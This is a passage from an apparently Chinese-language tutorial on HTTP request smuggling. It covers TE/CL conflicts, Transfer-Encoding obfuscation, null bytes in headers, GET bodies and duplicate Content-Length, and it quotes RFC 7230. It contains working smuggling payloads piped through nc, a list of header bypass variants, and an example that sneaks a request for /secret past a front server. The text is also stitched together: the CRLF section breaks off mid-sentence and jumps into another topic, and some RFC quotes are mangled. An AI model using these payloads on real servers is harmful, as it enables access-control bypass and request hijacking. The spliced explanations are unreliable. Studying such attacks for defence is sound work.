    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
以上正确的解析应该是解析成三个请求：
    GET / HTTP/1.1
    Host:localhost
    Content-length:56
    Transfer-Encoding: chunked
    Dummy:Header
    0
    GET /tmp HTTP/1.1
    Host:localhost
    Dummy:Header
    GET /tests HTTP/1.1
    Host:localhost
    Dummy:Header
而如果存在 TE & CL 优先级问题的话，会被解析成两个请求：
    GET / HTTP/1.1[CRLF]
    Host:localhost[CRLF]
    Content-length:56[CRLF]
    Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully)
    Dummy:Header[CRLF]
    [CRLF]
    0[CRLF]  (start of 56 bytes of body)
    [CRLF]
    GET /tmp HTTP/1.1[CRLF]
    Host:localhost[CRLF]
    Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)
    GET /tests HTTP/1.1
    Host:localhost
    Dummy:Header
### Bad Chunked Transmission
根据 [RFC7230 section 3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3)
：
> If a Transfer-Encoding header field is present in a request and the chunked
> transfer coding is not the final encoding, the message body length cannot be
> determined reliably; the server MUST respond with the 400 (Bad Request)
> status code and then close the connection.
也就是说当接受到`Transfer-Encoding: chunked, zorg`的时候，应该返回 400 错误。
这类可以有很多绕过，比如：
    Transfer-Encoding: xchunked
    Transfer-Encoding : chunked
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    Transfer-Encoding:[tab]chunked
    GET / HTTP/1.1
     Transfer-Encoding: chunked
    X: X[\n]Transfer-Encoding: chunked
    Transfer-Encoding
     : chunked
### Null In Headers
在一些用 C 写的中间件服务器当中比较容易产生这个问题，因为`\0`代表字符串结束标志，当用在 header
里面，如果我们用`\0`就可能让中间件出现一些不正常的解析。
比如说：
    # 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)
    printf 'GET / HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Content-\0dummy: foo\r\n'\
    'length: 56\r\n'\
    'Transfer-Encoding: chunked\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    'GET /tmp HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
有些中间件处理以上的请求时，当遇到`\0`的时候会继续换行读取，这样也会导致产生解析差异。
### CRLF
根据 [RFC7320 section-3.5](https://tools.ietf.org/html/rfc7230#section-3.5):
> Although the line terminator for the start-line and header fields is the
> sequence CRLF, a recipient MAY recognize a single LF as a line terminator
> and ignore any preceding CR.
也就是说除了 CRLF 我们还可以用 LF 作为 EOL，但是在 Node.js  ​ 其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。
在 [RFC7230 Content-Length](https://tools.ietf.org/html/rfc7230#section-3.3.2)
部分提到：
> ​ For example, a Content-Length header field is normally sent in a POST
> request even when the value is 0 (indicating an empty payload body). A user
> agent SHOULD NOT send a Content-Length header field when the request message
> does not contain a payload body and the method semantics do not anticipate
> such a body.
在最新的 [RFC7231 4.3.1 GET](https://tools.ietf.org/html/rfc7231#section-4.3.1)
中也仅仅提了一句：
> ​ A payload within a GET request message has no defined semantics; sending a
> payload body on a GET request might cause some existing implementations to
> reject the request.
对于类似拥有 body 字段并且以 Content-Length 指出其 body 长度的请求，RFC 并没有严格的说明 Server
应该如何去处理，所以大部分中间件对于拥有 body 的 GET
请求也是进行了宽松处理，但是也是部分情况，由于这些中间件没有一个严格的标准依据，所以也会产生解析差异导致 HTTP Smuggling 攻击。
这里我们举个简单且理想化的例子，Front 服务器对于 GET 请求允许携带 body ，而 Backend 服务器会忽略带 body 的 GET 请求。
当我们发送如下请求：
    GET / HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 41\r\n
    \r\n
    GET /secret HTTP/1.1\r\n
    Host: example.com\r\n
    \r\n
当 Front 服务器处理这个请求的时候，会把以上这个请求当作一个完整的请求转发给 Backend 服务器，而 Backend
服务求在处理这个服务器的时候，会把这个请求当作两个请求
    GET / HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 41\r\n
    \r\n
    GET /secret HTTP/1.1\r\n
    Host: example.com\r\n
    \r\n
这样我们就可以成功地进行了一次 HTTP Smuggling，从这个例子当中，我们也不难看出，如果有一个场景存在 HTTP Smuggling
漏洞，那么这个 Content-Length 数据就变得额外的重要，因为这影响到我们攻击是否成功，能否将我们的 HTTP 请求成功地“嵌入”在一个 HTTP
请求当中。
这里的计算方法与之前的类似，
    GET /secret HTTP/1.1\r\n                    -->     "GET /secret HTTP/1.1" 一共20个字符，加上CRLF一共22个字符
    Host: example.com\r\n                                   -->     "Host: example.com" 一共17个字符，加上CRLF一共19个字符
22 + 19 = 41 个字节
### Two Identical Fields - CL
这里我们以 Content-Length 举例，在 [RFC7230 section
3.3.2](https://tools.ietf.org/html/rfc7230#section-3.3.2) 中，
> If a message is received that has multiple Content-Length header fields with
> field-values consisting of the same decimal value, or a single Content-> Length header field with a field value containing a list of identical
> decimal values (e.g., "Content-Length: 42, 42"), indicating that duplicate
> Content-Length header fields have been generated or combined by an upstream
> message processor, then the recipient MUST either reject the message as
> invalid or replace the duplicated field-values with a single valid Content-> Length field containing that decimal value prior to determining the message
> body length or forwarding the message.
And [RFC 7230 section
3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3) 中也提到：
> If a message is received without Transfer-Encoding and with either multiple
> Content-Length header fields having differing field-values or a single
> Content-Length header field having an invalid value, then the message
> framing is invalid and the recipient MUST treat it as an unrecoverable
> error. If this is a request message, the server MUST respond with a 400 (Bad
> Request) status code and then close the connection.
RFC 当中对于这中情况也有了比较明确的规范，但是我们这里假设举一个比较简单的例子，我们发送以下请求：
    GET /suzann.html HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 0\r\n
    Content-Length: 46\r\n
    \r\n
    GET /walter.html HTTP/1.1\r\n